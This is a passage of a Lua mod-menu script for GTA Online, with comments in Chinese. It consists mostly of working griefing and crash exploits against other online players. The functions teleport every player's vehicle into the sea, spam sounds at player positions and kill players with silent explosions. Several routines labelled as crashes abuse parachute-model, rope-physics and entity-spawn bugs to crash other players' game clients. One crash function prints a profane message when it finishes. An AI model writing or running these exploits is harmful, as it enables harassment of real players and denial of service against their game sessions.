    self.vector3 = {}
    self.vector3.new = function (x, y, z)
        return {x = x, y = y, z = z}
    end
    self.vector3.add = function(a, b)
        return self.vector3.new(a.x + b.x, a.y + b.y, a.z + b.z)
    end
    self.vector3.sub = function(a, b)
        return self.vector3.new(a.x - b.x, a.y - b.y, a.z - b.z)
    end
    self.vector3.multiply = function (vec, num)
        return {x = vec.x * num, y = vec.y * num, z = vec.z * num}
    end
    return self
end

function get_waypoint_coords()
    return HUD.GET_BLIP_INFO_ID_COORD(HUD.GET_FIRST_BLIP_INFO_ID(HUD.GET_WAYPOINT_BLIP_ENUM_ID()))
end

--传送所有人的车辆到海洋
function allsqhy()
     local oldcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local ped = PLAYER.GET_PLAYER_PED(i)
            local pedCoords = ENTITY.GET_ENTITY_COORDS(ped)
            for c = 0, 5 do 
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pedCoords.x, pedCoords.y, pedCoords.z + 10, false, false, false)
                util.yield(100)
            end
            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                for a = 0, 10 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, 4500, -4400, 4, false, false, false)
                    util.yield(100)
                end
                for b = 0, 10 do
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, 4500, -4400, 4, false, false, false)
                end
            end
        end
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end
--传送所有人的车辆到花园银行
function allswre()
    local oldcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local pped = PLAYER.GET_PLAYER_PED(i)
            local pedCoords = ENTITY.GET_ENTITY_COORDS(pped)
            for c = 0, 5 do 
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pedCoords.x, pedCoords.y, pedCoords.z + 10, false, false, false)
                util.yield(100)
            end
            if PED.IS_PED_IN_ANY_VEHICLE(pped, false) then
                local veh = PED.GET_VEHICLE_PED_IS_IN(pped, false)
                for a = 0, 10 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -76, -819, 327, false, false, false)
                    util.yield(100)
                end
                for b = 0, 10 do
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -76, -819, 327, false, false, false)
                end
            end
        end
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end

--噪音
function zaoyin()		
    --{"Bed", "WastedSounds"}
        local pos = v3()
        local Audio_POS = {v3(-73.31681060791,-820.26013183594,326.17517089844),v3(2784.536,5994.213,354.275),v3(-983.292,-2636.995,89.524),v3(1747.518,4814.711,41.666),v3(1625.209,-76.936,166.651),v3(751.179,1245.13,353.832),v3(-1644.193,-1114.271,13.029),v3(462.795,5602.036,781.400),v3(-125.284,6204.561,40.164),v3(2099.765,1766.219,102.698)}
    
        for i = 1, #Audio_POS do
    
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
            pos.z = 2000.00
        
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
            pos.z = -2000.00
        
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
    
            for pid = 0, 31 do
                local pos =	NETWORK.NETWORK_GET_LAST_PLAYER_POS_RECEIVED_OVER_NETWORK(pid)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", pos.x, pos.y, pos.z, "WastedSounds", true, 999999999, true)
            end
       end		
end
--防空警报
function fangkongjingbao()
    local pos, exp_pos = v3(), v3()
    local Audio_POS = {v3(-73.31681060791,-820.26013183594,326.17517089844),v3(2784.536,5994.213,354.275),v3(-983.292,-2636.995,89.524),v3(1747.518,4814.711,41.666),v3(1625.209,-76.936,166.651),v3(751.179,1245.13,353.832),v3(-1644.193,-1114.271,13.029),v3(462.795,5602.036,781.400),v3(-125.284,6204.561,40.164),v3(2099.765,1766.219,102.698)}
	
	for i = 1, #Audio_POS do

	AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
	pos.z = 2000.00
	
	AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
		pos.z = -2000.00
	
    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
	
    for pid = 0, 31 do
        local pos =	NETWORK.NETWORK_GET_LAST_PLAYER_POS_RECEIVED_OVER_NETWORK(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pos.x, pos.y, pos.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
    end

	end
end
--震动屏幕
function shake_player(pid, power)
    local entity = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 7, 0, false, true, power)
end
--无声杀害
function kill_player(pid)
    local entity = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'] + 2, 7, 1000, false, true, 0)
end
--爆炸圈
function explosion_circle(ped, angle, radius)
    local ped_coords = ENTITY.GET_ENTITY_COORDS(ped)

    local offset_x = ped_coords.x
    local offset_y = ped_coords.y

    local x = offset_x + radius * math.cos(angle)
    local y = offset_y + radius * math.sin(angle)

    FIRE.ADD_EXPLOSION(x, y, ped_coords.z, 4, 1, true, false, 0)
end
--载具伞崩全局
function chesan()
        local spped = PLAYER.PLAYER_PED_ID()
        local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
        for i = 1, 20 do
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
            PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
            util.yield(200)
            VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2,1381105889)
            VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
            util.yield(200)
            entities.delete_by_handle(Ruiner2)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
	end
--人物伞崩全局V1
function san1()
        local spped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
        for n = 0 , 5 do
            local object_hash = util.joaat("prop_logpile_06b")
            STREAMING.REQUEST_MODEL(object_hash)
              while not STREAMING.HAS_MODEL_LOADED(object_hash) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, 0,0,500, false, true, true)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(spped, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(spped)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)

            local object_hash2 = util.joaat("prop_beach_parasol_03")
            STREAMING.REQUEST_MODEL(object_hash2)
              while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, 0,0,500, 0, 0, 1)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(spped, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(spped)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
end
--人物伞崩全局V2
function san2()
    		for n = 0 , 5 do
    			PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    			object_hash = 1381105889
    			            		    	STREAMING.REQUEST_MODEL(object_hash)
    	      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
    		       util.yield()
    	         end
    			PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
    			util.yield(1000)
    			for i = 0 , 20 do
    			PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    			end
    			util.yield(1000)
    			menu.trigger_commands("tplsia")
    			bush_hash = 720581693
    			            		    	STREAMING.REQUEST_MODEL(bush_hash)
    	      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
    		       util.yield()
    	         end
    		    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
               	util.yield(1000)
    			for i = 0 , 20 do
    			PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    			end
    			util.yield(1000)
    			menu.trigger_commands("tplsia")			
                end
end
--人物伞崩全局V3
function san3()
        local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        for n = 0 , 3 do
            local object_hash = util.joaat("v_ilev_light_wardrobe_face")
            STREAMING.REQUEST_MODEL(object_hash)
              while not STREAMING.HAS_MODEL_LOADED(object_hash) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

            local object_hash2 = util.joaat("v_ilev_light_wardrobe_face")
            STREAMING.REQUEST_MODEL(object_hash2)
              while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        util.yield(500)
    end
--人物伞崩全局V4
function san4()
local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
util.request_model(SelfPlayerPed)
    for n = 0 , 3 do
        local object_hash = util.joaat("prop_mk_num_6")
        STREAMING.REQUEST_MODEL(object_hash)
          while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
end
end
--人物伞崩全局V5
function san5()
    		for n = 0 , 5 do
    			PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    			object_hash = 1117917059
    			            		    	STREAMING.REQUEST_MODEL(object_hash)
    	      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
    		       util.yield()
    	         end
    			PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
    			util.yield(1000)
    			for i = 0 , 20 do
    			PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    			end
    			util.yield(1000)
    			menu.trigger_commands("tplsia")
    			bush_hash = -908104950
    			            		    	STREAMING.REQUEST_MODEL(bush_hash)
    	      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
    		       util.yield()
    	         end
    		    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
               	util.yield(1000)
    			for i = 0 , 20 do
    			PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    		    end
    			util.yield(1000)
    			menu.trigger_commands("tplsia")
    	end
end
--声音崩溃
function shengyin()
	    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
		local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
		end
        notification("Sound Spam Crash [Lobby] executed successfully.")
end
--CARGO崩溃
function CARGO()
        menu.trigger_commands("anticrashcam on")
		local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
        local cargobob = CreateVehicle(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
        local veh = CreateVehicle(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
        local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x, vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
		util.yield(2500)
		entities.delete_by_handle(cargobob)
        entities.delete_by_handle(veh)
		PHYSICS.DELETE_CHILD_ROPE(newRope)
		menu.trigger_commands("anticrashcam off")
		notification("Go Fuck Your Self")
end
--大春痘崩溃
function big_chungus()
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
local mdl = util.joaat("A_C_Cat_01")
local mdl2 = util.joaat("U_M_Y_Zombie_01")
local mdl3 = util.joaat("A_F_M_ProlHost_01")
local mdl4 = util.joaat("A_M_M_SouCent_01")
local veh_mdl = util.joaat("insurgent2")
local veh_mdl2 = util.joaat("brawler")
util.request_model(veh_mdl)
util.request_model(veh_mdl2)
util.request_model(mdl)
util.request_model(mdl2)
util.request_model(mdl3)
util.request_model(mdl4)
for i = 1, 250 do
    local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
    local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
    local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
    local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
    local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
    local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
    PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

    PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

    PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

    PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

    PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
    PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

    PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
    PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

    TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)

    TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
    util.yield(100)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)

    PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
    
    PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

    TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)

    ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
    ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
    ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
    ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
    PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
    PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
    ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
    ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
end
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
entities.delete_by_handle(mdl)
entities.delete_by_handle(mdl2)
entities.delete_by_handle(mdl3)
entities.delete_by_handle(mdl4)
entities.delete_by_handle(veh_mdl)
entities.delete_by_handle(veh_mdl2)
util.yield(1000)
end

--数学崩溃
function math_crash()
    local getPlayerPed = PLAYER.GET_PLAYER_PED
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    pos.x = pos.x+5
    ppos.z = ppos.z+1
    Utillitruck3 = entities.create_vehicle(2132890591, pos, 0)
    Utillitruck3_pos = ENTITY.GET_ENTITY_COORDS(Utillitruck3)
    kur = entities.create_ped(26, 2727244247, ppos, 0)
    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)

    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    util.yield(100)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center") 
    util.yield(100)

    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local pc = getEntityCoords(getPlayerPed(PlayerID))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    local vehc = getEntityCoords(veh); local pedc = getEntityCoords(ped)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
    util.yield(1000)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    PHYSICS.DELETE_CHILD_ROPE(rope)
    PHYSICS.ROPE_UNLOAD_TEXTURES()
end
--恢复模型
function restore_model()
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
        menu.trigger_commands("walkstyle normal")
    else
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("walkstyle normal")
    end
end
--实体池限制
function entity_limit()
local ped_count = 0

for _, ped in pairs(entities.get_all_peds_as_handles()) do

    if ped ~= players.user_ped() then

        ped_count += 1

    end

    if ped_count >= ped_limit then

        for _, ped in pairs(entities.get_all_peds_as_handles()) do

            entities.delete_by_handle(ped)

        end

        notification("Ped池达到上限,正在清理...")

    end

end

local veh__count = 0

for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do

    veh__count += 1

    if veh__count >= veh_limit then

        for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do

            entities.delete_by_handle(veh)

        end

        notification("载具池达到上限,正在清理...")

    end

end

local obj_count = 0

for _, obj in pairs(entities.get_all_objects_as_handles()) do

    obj_count += 1

    if obj_count >= obj_limit then

